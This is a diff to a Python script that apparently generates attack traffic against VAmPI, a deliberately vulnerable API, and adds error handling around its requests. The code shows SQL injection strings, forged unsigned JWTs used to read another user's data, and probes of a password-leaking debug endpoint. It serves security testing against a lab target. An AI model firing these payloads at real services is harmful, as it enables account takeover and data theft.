@@ -159,8 +159,11 @@ def run_authenticated(users, rounds, base, tout):
 # ── UNAUTHENTICATED population ────────────────────────────────────────────────
 def f_excessive_data_exposure(base, tout):
     """GET /users/v1/_debug returns every user's plaintext password."""
-    r = requests.get(f"{base}/users/v1/_debug", headers=vm.consumer_headers(900), timeout=tout)
-    vm.bump("unauth_debug", r.status_code)
+    try:
+        r = requests.get(f"{base}/users/v1/_debug", headers=vm.consumer_headers(900), timeout=tout)
+        vm.bump("unauth_debug", r.status_code)
+    except requests.RequestException:
+        vm.bump("unauth_debug", "err")
 
 
 def f_unauth_sensitive(base, tout, pool):
@@ -183,13 +186,16 @@ def f_sensitive_query_params(base, tout):
     """Sensitive values (username/password/token) in the query string."""
     qp = {"username": "victim", "password": "Secret123!",
           "token": vm.make_jwt("victim")}
-    r = requests.post(f"{base}/users/v1/login", params=qp,
-                      json={"username": qp["username"], "password": qp["password"]},
-                      headers=vm.consumer_headers(905), timeout=tout)
-    vm.bump("sensitive_query", r.status_code)
-    r = requests.get(f"{base}/users/v1/{qp['username']}", params=qp,
-                     headers=vm.consumer_headers(905), timeout=tout)
-    vm.bump("sensitive_query", r.status_code)
+    try:
+        r = requests.post(f"{base}/users/v1/login", params=qp,
+                          json={"username": qp["username"], "password": qp["password"]},
+                          headers=vm.consumer_headers(905), timeout=tout)
+        vm.bump("sensitive_query", r.status_code)
+        r = requests.get(f"{base}/users/v1/{qp['username']}", params=qp,
+                         headers=vm.consumer_headers(905), timeout=tout)
+        vm.bump("sensitive_query", r.status_code)
+    except requests.RequestException:
+        vm.bump("sensitive_query", "err")
 
 
 def f_injection_reflection(base, tout):
@@ -198,17 +204,26 @@ def f_injection_reflection(base, tout):
                 f"{marker}' UNION SELECT username,password FROM users --"]
     for p in payloads:
         # SQLi / XSS in the username path
-        r = requests.get(f"{base}/users/v1/{p}", headers=vm.consumer_headers(906), timeout=tout)
-        vm.bump("injection", r.status_code)
+        try:
+            r = requests.get(f"{base}/users/v1/{p}", headers=vm.consumer_headers(906), timeout=tout)
+            vm.bump("injection", r.status_code)
+        except requests.RequestException:
+            vm.bump("injection", "err")
         # SQLi / XSS in the book title path
-        r = requests.get(f"{base}/books/v1/{p}", headers=vm.consumer_headers(906), timeout=tout)
-        vm.bump("injection", r.status_code)
+        try:
+            r = requests.get(f"{base}/books/v1/{p}", headers=vm.consumer_headers(906), timeout=tout)
+            vm.bump("injection", r.status_code)
+        except requests.RequestException:
+            vm.bump("injection", "err")
 
 
 def f_weak_password(base, tout):
     for pw in ("123", "password", "abc", "111111", "qwerty"):
         name = vm.rand_username("weak")
-        code = register(base, name, pw, vm.rand_email(name), vm.consumer_headers(907), tout)
+        try:
+            code = register(base, name, pw, vm.rand_email(name), vm.consumer_headers(907), tout)
+        except requests.RequestException:
+            code = "err"
         vm.bump("weak_password", code)
 
 
@@ -216,22 +231,28 @@ def f_sqli_users(base, tout):
     """Classic VAmPI SQLi on GET /users/v1/{username}."""
     for q in ("' OR '1'='1", "' OR 1=1--", "1' OR '1'='1' --",
               "admin' UNION SELECT username,password,email,admin FROM users --"):
-        r = requests.get(f"{base}/users/v1/{q}", headers=vm.consumer_headers(911), timeout=tout)
-        vm.bump("sqli_users", r.status_code)
+        try:
+            r = requests.get(f"{base}/users/v1/{q}", headers=vm.consumer_headers(911), timeout=tout)
+            vm.bump("sqli_users", r.status_code)
+        except requests.RequestException:
+            vm.bump("sqli_users", "err")
 
 
 def f_tech_info_exposure(base, tout):
-    r = requests.post(f"{base}/users/v1/login", data="{not:json,,}",
-                      headers={**vm.consumer_headers(908), "Content-Type": "application/json"},
-                      timeout=tout)
-    vm.bump("tech_info", r.status_code)
-    r = requests.post(f"{base}/users/v1/login",
-                      json={"username": {"$ne": None}, "password": ["array"]},
-                      headers=vm.consumer_headers(908), timeout=tout)
-    vm.bump("tech_info", r.status_code)
-    r = requests.post(f"{base}/users/v1/register", json={"username": 5, "password": {"x": 1}},
-                      headers=vm.consumer_headers(908), timeout=tout)
-    vm.bump("tech_info", r.status_code)
+    try:
+        r = requests.post(f"{base}/users/v1/login", data="{not:json,,}",
+                          headers={**vm.consumer_headers(908), "Content-Type": "application/json"},
+                          timeout=tout)
+        vm.bump("tech_info", r.status_code)
+        r = requests.post(f"{base}/users/v1/login",
+                          json={"username": {"$ne": None}, "password": ["array"]},
+                          headers=vm.consumer_headers(908), timeout=tout)
+        vm.bump("tech_info", r.status_code)
+        r = requests.post(f"{base}/users/v1/register", json={"username": 5, "password": {"x": 1}},
+                          headers=vm.consumer_headers(908), timeout=tout)
+        vm.bump("tech_info", r.status_code)
+    except requests.RequestException:
+        vm.bump("tech_info", "err")
 
 
 def f_excessive_single_user(base, intensity, tout, target):
@@ -263,24 +284,26 @@ def run_unauthenticated(base, tout, intensity, pool_usernames, brute_target):
 
 
 # ── BAD-TOKEN population ──────────────────────────────────────────────────────
+def _get_or_err(base, path, key, hdrs, tout):
+    try:
+        r = requests.get(f"{base}{path}", headers=hdrs, timeout=tout)
+        vm.bump(key, r.status_code)
+    except requests.RequestException:
+        vm.bump(key, "err")
+
+
 def run_bad_tokens(base, tout, first_user):
     print("[bad-token] generating unsigned / expired / long-life JWTs ...")
     # unsigned (alg=none)
-    r = requests.get(f"{base}/me", headers=vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), timeout=tout)
-    vm.bump("unsigned_jwt", r.status_code)
-    r = requests.get(f"{base}/users/v1/{first_user}", headers=vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), timeout=tout)
-    vm.bump("unsigned_jwt_user", r.status_code)
-    r = requests.get(f"{base}/books/v1/bookTitle10", headers=vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), timeout=tout)
-    vm.bump("unsigned_jwt_book", r.status_code)
+    _get_or_err(base, "/me", "unsigned_jwt", vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), tout)
+    _get_or_err(base, f"/users/v1/{first_user}", "unsigned_jwt_user", vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), tout)
+    _get_or_err(base, "/books/v1/bookTitle10", "unsigned_jwt_book", vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(901)), tout)
     # expired
-    r = requests.get(f"{base}/me", headers=vm.auth_headers(vm.make_jwt(first_user, alg="HS256", exp_delta=-86400), vm.consumer_headers(902)), timeout=tout)
-    vm.bump("expired_jwt", r.status_code)
+    _get_or_err(base, "/me", "expired_jwt", vm.auth_headers(vm.make_jwt(first_user, alg="HS256", exp_delta=-86400), vm.consumer_headers(902)), tout)
     # long-life
-    r = requests.get(f"{base}/me", headers=vm.auth_headers(vm.make_jwt(first_user, alg="HS256", exp_delta=10 * 365 * 86400), vm.consumer_headers(903)), timeout=tout)
-    vm.bump("longlife_jwt", r.status_code)
+    _get_or_err(base, "/me", "longlife_jwt", vm.auth_headers(vm.make_jwt(first_user, alg="HS256", exp_delta=10 * 365 * 86400), vm.consumer_headers(903)), tout)
     # BOLA + bad token: read another user's record with a forged token
-    r = requests.get(f"{base}/users/v1/name2", headers=vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(904)), timeout=tout)
-    vm.bump("badauth_bola", r.status_code)
+    _get_or_err(base, "/users/v1/name2", "badauth_bola", vm.auth_headers(vm.make_jwt(first_user, alg="none"), vm.consumer_headers(904)), tout)
 
 
 # ── Main ───────────────────────────────────────────────────────────────────────
